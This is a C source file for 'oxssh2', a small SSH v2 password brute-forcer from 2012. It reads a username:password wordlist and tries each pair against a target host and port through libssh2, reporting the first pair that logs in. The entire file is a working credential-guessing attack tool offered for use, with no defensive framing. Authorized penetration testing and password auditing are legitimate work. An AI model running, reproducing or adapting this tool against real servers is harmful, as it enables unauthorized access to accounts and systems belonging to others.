/*
 * oxssh2.c - small ssh v2 password bruteforcer
 * Copyright (C) 2012 Federico Fazzi - http://deftcode.org
 *
 * This file may be licensed under the terms of of the
 * GNU General Public License Version 2 (the ``GPL'').
 *
 * Software distributed under the License is distributed
 * on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
 * express or implied. See the GPL for the specific language
 * governing rights and limitations.
 *
 * You should have received a copy of the GPL along with this
 * program. If not, go to http://www.gnu.org/licenses/gpl.html
 * or write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 *
 * usage: ./oxssh2 <hostname> <port> <words.lst>
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <libssh2.h>
#include <termios.h>

/* terminal structures */
struct termios stored_term, tmp_term;

int try(char *hostname, int port, char *username, char *password)
{
	int sockfd, ret;
	LIBSSH2_SESSION *session;
	struct sockaddr_in sockad;
	struct hostent *sockhs;

	if ((sockhs = gethostbyname(hostname)) == NULL)
		return -1;

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd < 0)
		return -1;

	sockad.sin_family = AF_INET;
	sockad.sin_port = htons(port);
	sockad.sin_addr = *((struct in_addr *)sockhs->h_addr);
	memset(sockad.sin_zero, '\0', sizeof sockad.sin_zero);

	if (connect(sockfd, (struct sockaddr *)&sockad, sizeof sockad) == -1) {
		close(sockfd);
		return -1;
	}

	/* initialize libssh2 library */
	ret = libssh2_init(0);

	if (ret != 0) {
		close(sockfd);
		exit(-1);
	}

	/* initialize libssh2 session */
	session = libssh2_session_init();

	if (!session) {
		close(sockfd);
		exit(-1);
	}

	/* set libssh2 mode non-blocking */
	libssh2_session_set_blocking(session, 0);

	/* libssh2 negotiation */
	while ((ret =
		libssh2_session_handshake(session,
					  sockfd)) == LIBSSH2_ERROR_EAGAIN) ;
	if (ret) {
		close(sockfd);
		return -1;
	}

	/* test username, password authentication */
	while ((ret =
		libssh2_userauth_password(session, username,
					  password)) == LIBSSH2_ERROR_EAGAIN) ;
	if (ret) {
		close(sockfd);
		return -1;
	} else {
		close(sockfd);
		return 0;
	}
}

void usage(char **argv)
{
	printf("\n\toxssh2 - small ssh v2 password bruteforcer \n" \
	"http://deftcode.org/ (C) 2012\n\n" \
	"%s < host > < port > < words.lst >\n\n", argv[0]);
	exit(-1);
}

int main(int argc, char **argv)
{
	int port, i, count = 1, total = 0;
	char buf[512], *tok;
	char hostname[32], username[32], password[32];
	FILE *fd;

	if (argc < 4)
		usage(argv);

	port = atoi(argv[2]);
	memset(hostname, 0, sizeof hostname);
	snprintf(hostname, sizeof hostname, "%s", argv[1]);

	if ((fd = fopen(argv[3], "r")) == NULL) {
		puts("oxssh2: unable to open wordlist file.");
		return -1;
	}

	/* combination line counter */
	while (fgets(buf, (sizeof buf) - 1, fd))
		total++;

	/* save current terminal settings */ 
	tcgetattr(fileno(stdin), &stored_term);
	tmp_term = stored_term;

	/* input chars are echoed back to the terminal */
	tmp_term.c_lflag &= ~ECHO;
	tcsetattr(fileno(stdin), TCSANOW, &tmp_term);

	printf("\n\toxssh2 - small ssh v2 password bruteforcer \n"\
	"http://deftcode.org/ (C) 2012\n\n" \
	"Target: %s - Port: %d - Protocol: SSH v2\n\n", hostname, port);

	rewind(fd);
	while (fgets(buf, (sizeof buf) - 1, fd)) {
		i = strlen(buf);
		buf[i - 1] = 0;

		i = 0;
		/* save username, password values */
		tok = strtok(buf, ":");
		while (tok != NULL) {
			if (!i) {
				memset(username, 0, sizeof username);
				snprintf(username, sizeof username, "%s", tok);
				i++;
			} else if (i == 1) {
				memset(password, 0, sizeof password);
				snprintf(password, sizeof password, "%s", tok);

				printf
				    ("\r\toxssh2: testing combination [%-16.16s][%-16.16s] (tried: %d/%d)",
				     username, password, count, total);
				fflush(stdout);

				/* try to authenticate current username, password */
				if (!try(hostname, port, username, password)) {
					printf
					    ("\n\toxssh2: combination found (username: %s - password: %s)\n\n",
					     username, password);
					/* restore terminal */
					tcsetattr(fileno(stdin), TCSANOW,
						  &stored_term);
					fclose(fd);
					return 0;
				}

				i--;
			}
			tok = strtok(NULL, ":");
		}
		count++;
	}

	puts("\n\toxssh2: no combination found!\n");
	fclose(fd);

	/* restore terminal */
	tcsetattr(fileno(stdin), TCSANOW, &stored_term);

	return 0;
}
